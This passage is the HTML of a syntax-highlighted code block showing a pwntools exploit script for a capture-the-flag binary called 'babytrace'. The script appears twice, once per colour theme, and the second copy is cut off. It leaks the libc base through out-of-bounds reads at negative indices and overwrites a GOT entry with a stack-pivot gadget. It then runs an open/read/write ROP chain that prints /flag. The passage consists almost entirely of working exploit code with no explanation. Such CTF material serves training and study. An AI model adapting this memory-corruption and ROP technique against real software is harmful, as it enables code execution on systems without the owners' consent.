grep_process </span><span style="color:#999999">=</span><span style="color:#393A34"> subprocess</span><span style="color:#999999">.</span><span style="color:#393A34">Popen</span><span style="color:#2993a3">(</span><span style="color:#393A34">grep_command</span><span style="color:#999999">,</span><span style="color:#B07D48"> stdin</span><span style="color:#999999">=</span><span style="color:#393A34">ps_process</span><span style="color:#999999">.</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#B07D48"> stdout</span><span style="color:#999999">=</span><span style="color:#393A34">subprocess</span><span style="color:#999999">.</span><span style="color:#A65E2B">PIPE</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ps_process</span><span style="color:#999999">.</span><span style="color:#393A34">stdout</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    output </span><span style="color:#999999">=</span><span style="color:#393A34"> grep_process</span><span style="color:#999999">.</span><span style="color:#393A34">communicate</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    s </span><span style="color:#999999">=</span><span style="color:#393A34"> output</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">    # print(s.split("\n"))</span><br><span style="color:#393A34">    pid </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#1e754f">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#2F798A">7</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    print</span><span style="color:#2993a3">(</span><span style="color:#393A34">pid</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">    # pause()</span><br><span style="color:#393A34">    attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">pid</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#B56959">    breakrva 0xd06</span><br><span style="color:#B56959">    # breakrva 0xd82</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">choose one ></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> write</span><span style="color:#2993a3">(</span><span style="color:#393A34">buf</span><span style="color:#999999">,</span><span style="color:#393A34"> idx</span><span style="color:#999999">,</span><span style="color:#393A34"> value</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">recv:</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> buf</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">which one?</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">set value?</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">value</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> read</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">which one?</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">] = </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> res</span><br><br><br><span style="color:#393A34">stderr </span><span style="color:#999999">=</span><span style="color:#393A34"> read</span><span style="color:#2993a3">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base </span><span style="color:#999999">=</span><span style="color:#393A34"> stderr </span><span style="color:#AB5959">-</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">_IO_2_1_stderr_</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">rbp_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> read</span><span style="color:#2993a3">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"rbp_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">rbp_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">buf_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> rbp_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">250</span><br><span style="color:#393A34">start_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> rbp_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><br><br><span style="color:#393A34">strlen_got </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">219098</span><br><span style="color:#393A34">int1_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000c6d6e</span><br><span style="color:#393A34">add_rsp_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000114b5c</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002a3e5</span><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002be51</span><br><span style="color:#393A34">pop_rdx_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000796a2</span><br><span style="color:#393A34">pop_rax_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000045eb0</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000091316</span><br><br><span style="color:#393A34">offset </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">start_addr </span><span style="color:#AB5959">-</span><span style="color:#393A34"> strlen_got</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 8</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">int1_ret</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> buf_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> buf_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">300</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> buf_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">300</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> payload</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#393A34"> asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">ret</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/flag</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#393A34">offset</span><span style="color:#999999">,</span><span style="color:#393A34"> add_rsp_ret</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">babytrace_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    command </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ps</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-ax</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    grep_command </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">grep</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> proc</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    ps_process </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Popen</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">command</span><span style="color:#666666">,</span><span style="color:#BD976A"> stdout</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">subprocess</span><span style="color:#666666">.</span><span style="color:#C99076">PIPE</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    grep_process </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Popen</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">grep_command</span><span style="color:#666666">,</span><span style="color:#BD976A"> stdin</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">ps_process</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#BD976A"> stdout</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">subprocess</span><span style="color:#666666">.</span><span style="color:#C99076">PIPE</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ps_process</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    output </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> grep_process</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">communicate</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> output</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">    # print(s.split("\n"))</span><br><span style="color:#DBD7CAEE">    pid </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">    # pause()</span><br><span style="color:#DBD7CAEE">    attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#C98A7D">    breakrva 0xd06</span><br><span style="color:#C98A7D">    # breakrva 0xd82</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">choose one ></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> value</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">recv:</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">which one?</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">set value?</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> read</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">which one?</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">] = </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> res</span><br><br><br><span style="color:#DBD7CAEE">stderr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> read</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stderr </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">_IO_2_1_stderr_</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">rbp_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> read</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"rbp_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">rbp_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">buf_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> rbp_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">250</span><br><span style="color:#DBD7CAEE">start_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> rbp_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><br><br><span style="color:#DBD7CAEE">strlen_got </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">219098</span><br><span style="color:#DBD7CAEE">int1_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000c6d6e</span><br><span style="color:#DBD7CAEE">add_rsp_ret </span><span 